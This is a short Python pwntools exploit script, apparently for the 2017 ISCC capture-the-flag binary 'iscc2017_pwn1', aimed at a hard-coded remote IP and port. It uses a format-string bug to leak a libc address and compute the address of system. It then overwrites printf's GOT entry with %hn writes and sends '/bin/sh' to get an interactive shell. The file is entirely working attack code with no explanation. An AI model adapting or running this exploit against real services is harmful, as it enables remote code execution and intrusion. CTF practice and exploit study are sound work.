from pwn import *
import time

#os.environ['LD_PRELOAD'] = './libc32.so'
context.log_level = 'debug'
context.arch = "i386"
exe = './iscc2017_pwn1'
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#s= remote('127.0.0.1',9992,timeout=60)
s= remote('115.28.185.220',11111,timeout=60)
#s = process(exe)
libc = ELF("./libc32.so")
 
system_libc =  libc.symbols['system']#0x0003FE70
print "%x"%system_libc
 
libc_start_main_libc = libc.symbols['__libc_start_main']#0x000199E0 
print "%x"%libc_start_main_libc

printf_libc = libc.symbols['printf']#0x0004cDD0 
print "%x"%printf_libc

printf_got = 0x0804A010
puts_got = 0x0804A01C 
 
s.recvuntil('plz input$')  
s.sendline("1")
s.recvuntil('please input your name:\n')

s.sendline("%35$x")  # get libc_start_main real addr

libc_start_main_real = int(s.recvn(8),16) - 243  # leak real_addr in process
print "%x" % libc_start_main_real
 
system_real = libc_start_main_real + system_libc - libc_start_main_libc
print "system_real: %x" % system_real

printf_real = libc_start_main_real + printf_libc - libc_start_main_libc
print "printf_real: %x" % printf_real
#gets_real   = fgets_real + gets_libc - fgets_libc 



s.recvuntil('plz input$')
s.sendline("1")
s.recvuntil('please input your name:\n')

payload = p32(printf_got)+"%"+str((system_real)-4)+"c%6$n"

payload1 = p32(printf_got)+p32(printf_got+2)+"%"+str((system_real & 0xffff)-8)+"c%6$hn"  # low addr
payload2 = "%"+str(((system_real >>16) & 0xffff)-(system_real & 0xffff))+"c%7$hn"  # high addr



s.sendline(payload1) # printf goto system  
#s.sendline(p32(printf_got)+"%"+str(123-4)+"c%1$n") # printf goto system  

s.recvuntil('2.heiheihei\n')
s.sendline("1")
s.recvuntil('please input your name:\n')

s.sendline('/bin/sh\x00')
s.interactive()

